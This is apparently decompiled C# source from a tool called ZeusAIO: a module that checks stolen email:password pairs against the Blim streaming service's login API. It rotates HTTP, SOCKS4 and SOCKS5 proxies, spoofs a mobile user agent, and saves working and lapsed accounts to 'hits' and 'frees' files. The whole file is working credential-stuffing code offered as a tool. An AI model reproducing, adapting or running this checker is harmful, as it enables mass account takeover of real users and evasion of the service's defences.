// Decompiled with JetBrains decompiler
// Type: Blim.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using ZeusAIO;

namespace Blim
{
  internal class Check
  {
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int free = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static bool CheckAccount(string[] s, string proxy)
    {
      for (int index = 0; index < Config.config.Retries + 1; ++index)
      {
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
              if (mainmenu.proxyProtocol == "HTTP")
                httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS4")
                httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS5")
                httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
              httpRequest.UserAgent = "Shopify Mobile/Android/8.26.0 (Build 32571 with API 22 on Samsung SM-N950N)";
              httpRequest.IgnoreProtocolErrors = true;
              httpRequest.AllowAutoRedirect = false;
              httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
              httpRequest.AddHeader("Accept", "application/json, text/plain, */*");
              string str1 = "{\"email\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\",\"remember\":\"false\",\"clientId\":\"3\"}";
              string str2 = httpRequest.Post("https://api.blim.com/account/login", str1, "application/json;charset=UTF-8").ToString();
              if (str2.Contains("status\":\"Active"))
              {
                ++mainmenu.hits;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[HIT - BLIM] " + s[0] + ":" + s[1], Color.Green);
                Export.AsResult("/Blim_hits", s[0] + ":" + s[1]);
                return false;
              }
              if (str2.Contains("status\":\"Missing Payment") || str2.Contains("status\":\"Cancelled"))
              {
                ++mainmenu.frees;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[FREE - BLIM] " + s[0] + ":" + s[1], Color.OrangeRed);
                Export.AsResult("/Blim_frees", s[0] + ":" + s[1]);
                return false;
              }
              break;
            }
          }
          catch (Exception ex)
          {
            ++mainmenu.errors;
          }
        }
      }
      return false;
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
  }
}
